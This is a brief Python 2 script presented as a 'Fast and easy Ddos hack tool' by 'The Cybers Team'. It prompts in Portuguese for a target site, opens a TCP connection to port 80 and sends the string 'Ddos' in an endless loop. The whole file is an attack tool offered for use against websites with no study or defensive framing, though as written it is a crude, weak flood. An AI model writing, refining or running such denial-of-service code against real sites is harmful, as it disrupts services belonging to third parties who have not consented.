import os
import socket
os.system('cls')
header="""
____ _              ___      _                     _____                      
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                                 

More: https://www.facebook.com/TheCybersTeam
Fast and easy Ddos hack tool Beta 0.1
"""
print header

cybers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cybers.connect((raw_input("Digite o site: "),80))

while 1:
	print "Sending..."
	cybers.send("Ddos")
